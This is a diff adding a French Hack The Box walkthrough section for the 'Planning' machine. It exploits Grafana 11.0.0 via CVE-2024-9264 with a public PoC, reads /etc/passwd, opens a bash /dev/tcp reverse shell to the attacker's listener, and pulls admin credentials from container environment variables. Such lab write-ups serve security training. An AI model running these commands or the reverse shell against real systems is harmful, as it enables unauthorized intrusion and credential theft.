@@ -442,9 +442,248 @@ Port 80 (http)
 
 ## Prise pied
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+L’énumération a mis en évidence un sous-domaine Grafana exposé sur `grafana.planning.htb`.
+
+La page de connexion confirme l’utilisation de **Grafana v11.0.0**.
+
+
+
+![alt="Page de connexion Grafana v11.0.0 sur planning.htb avec authentification admin et affichage de la version vulnérable utilisée pour exploiter CVE-2024-9264"](grafana-login.png)
+
+Hack The Box fournit également les identifiants suivants :
+
+```bash
+admin:0D5oT70Fq13EvB5r
+```
+
+Ils permettent d’accéder à l’interface Grafana :
+
+![alt="Interface d’accueil Grafana après connexion administrateur sur planning.htb permettant l’exploration des fonctionnalités et la préparation de l’exploitation de CVE-2024-9264"](welcome-to-grafana.png)
+
+
+
+Une recherche rapide sur les vulnérabilités affectant Grafana 11.0.0 mène immédiatement vers **CVE-2024-9264**.
+
+Cette vulnérabilité post-authentification offre notamment deux possibilités intéressantes :
+
+- la lecture de fichiers arbitraires ;
+- l’exécution de commandes via les fonctionnalités DuckDB intégrées à Grafana.
+
+Tu t’appuies ensuite sur le PoC public suivant :
+
+https://github.com/nollium/CVE-2024-9264
+
+### Validation de l’exploitation CVE-2024-9264
+
+Tu clones le dépôt du PoC sur ta machine Kali :
+
+```bash
+git clone https://github.com/nollium/CVE-2024-9264.git
+cd CVE-2024-9264
+```
+
+
+
+En suivant le README du projet, tu installes ensuite les dépendances Python nécessaires en t’appuyant sur la recette {{< recette "installation-modules-python3-kali" >}} :
+
+```bash
+pip install -r requirements.txt --break-system-packages
+```
+
+Tu affiches ensuite l’aide du script afin de vérifier les fonctionnalités disponibles :
+
+```bash
+python3 CVE-2024-9264.py -h
+Usage: CVE-2024-9264.py [-h] [-u USER] [-p PASSWORD] [-f FILE] [-q QUERY] [-c COMMAND] url
+
+Exploit for Grafana post-auth file-read and RCE (CVE-2024-9264).
+
+Positional Arguments:
+  url                   URL of the Grafana instance to exploit
+
+Options:
+  -h, --help            show this help message and exit
+  -u, --user USER       Username to log in as, defaults to 'admin'
+  -p, --password PASSWORD
+                        Password used to log in, defaults to 'admin'
+  -f, --file FILE       File to read on the server, defaults to '/etc/passwd'
+  -q, --query QUERY     Optional query to run instead of reading a file
+  -c, --command COMMAND
+                        Optional command to execute on the server
+
+```
+
+Le script permet notamment :
+
+- de lire un fichier avec `-f` ;
+- d’exécuter une commande avec `-c`.
+
+Tu commences par tester une commande simple :
+
+```bash
+python3 CVE-2024-9264.py \
+-u admin \
+-p '0D5oT70Fq13EvB5r' \
+-c 'bash -c id' \
+http://grafana.planning.htb
+```
+
+Résultat :
+
+```bash
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Executing command: bash -c "id"
+[+] Successfully ran duckdb query:
+[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash -c "id" >/tmp/grafana_cmd_output 2>&1 |'):
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+La commande est bien exécutée avec l’utilisateur `root`.
+
+Il faut toutefois rester prudent : ce `root` correspond simplement au contexte d’exécution de Grafana. Rien ne prouve qu’il s’agit du système hôte.
+
+### Lecture de fichiers
+
+Tu testes ensuite la lecture de fichiers avec `/etc/passwd` :
+
+```bash
+python3 CVE-2024-9264.py \
+-u admin \
+-p '0D5oT70Fq13EvB5r' \
+-f /etc/passwd \
+http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Reading file: /etc/passwd
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/etc/passwd'):
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+grafana:x:472:0::/home/grafana:/usr/sbin/nologin
+```
+
+Le fichier est bien lu, mais son contenu donne déjà un indice important :
+
+```
+root:x:0:0:root:/root:/bin/bash
+grafana:x:472:0::/home/grafana:/usr/sbin/nologin
+```
+
+La présence de l’utilisateur `grafana`, associée aux chemins Grafana classiques, confirme que l’exécution se fait dans l’environnement Grafana.
+
+### Reverse shell
+
+Tu peux maintenant remplacer la commande de test par un reverse shell.
+
+Sur Kali, tu prépares l’écoute :
+
+```bash
+nc -lvnp 4444
+```
+
+Puis tu lances l’exploitation :
+
+```bash
+python3 CVE-2024-9264.py \
+-u admin \
+-p '0D5oT70Fq13EvB5r' \
+-c 'bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"' \
+http://grafana.planning.htb
+
+```
+
+
+
+Tu obtiens alors un shell interactif :
+
+```bash
+Connection received on 10.129.36.69 60514
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@7ce659d667d7:~#
+```
+
+**Le nom d’hôte `7ce659d667d7`, composé d’un identifiant hexadécimal court, est typique d’un conteneur Docker. Cela confirme que le reverse shell obtenu via Grafana ne donne pas directement accès à l’hôte `planning.htb`, mais à un conteneur.**
+
+### Analyse de l’environnement Grafana
+
+Après l’obtention du reverse shell, plusieurs pistes d’énumération sont possibles.
+
+Une première approche consiste à parcourir les différents menus d’administration et de configuration proposés par Grafana afin d’y rechercher des informations sensibles ou des erreurs de configuration intéressantes.
+
+En pratique, cette exploration se révèle longue et fastidieuse :
+
+\- la majorité des paramètres semblent correspondre à une installation relativement standard ;
+\- aucune datasource sensible n’est exposée ;
+\- aucun secret ou jeton réutilisable n’apparaît dans l’interface ;
+\- aucune fonctionnalité immédiatement exploitable n’apparaît.
+
+Cette phase d’exploration ne débouche donc sur rien d’exploitable directement.
+
+En consultant ensuite la documentation Grafana accessible depuis l’interface, tu remarques que la configuration peut être surchargée via des variables d’environnement préfixées par `GF_`.
+
+
+
+![alt="Documentation Grafana expliquant l’override de configuration via variables d’environnement GF_SECURITY_ADMIN_USER et GF_SECURITY_ADMIN_PASSWORD utilisé dans le conteneur Grafana de planning.htb"](env-variables.png)
+
+Tu affiches donc les variables d’environnement du shell obtenu :
+
+```bash
+env
+```
+
+Résultat :
+
+```bash
+AWS_AUTH_SESSION_DURATION=15m
+HOSTNAME=7ce659d667d7
+PWD=/usr/share/grafana
+AWS_AUTH_AssumeRoleEnabled=true
+GF_PATHS_HOME=/usr/share/grafana
+AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+HOME=/usr/share/grafana
+AWS_AUTH_EXTERNAL_ID=
+SHLVL=2
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo
+GF_PATHS_DATA=/var/lib/grafana
+GF_PATHS_LOGS=/var/log/grafana
+PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+```
+
+
+
+Les variables `GF_SECURITY_ADMIN_USER` et `GF_SECURITY_ADMIN_PASSWORD` contiennent directement des identifiants :
+
+```text
+enzo:RioTecRANDEntANT!
+```
+
+Ces identifiants ne correspondent pas au compte `admin` utilisé précédemment pour accéder à Grafana.
+
+La suite logique consiste donc à tester ce couple utilisateur/mot de passe en SSH sur la machine cible.
 
 ---
 
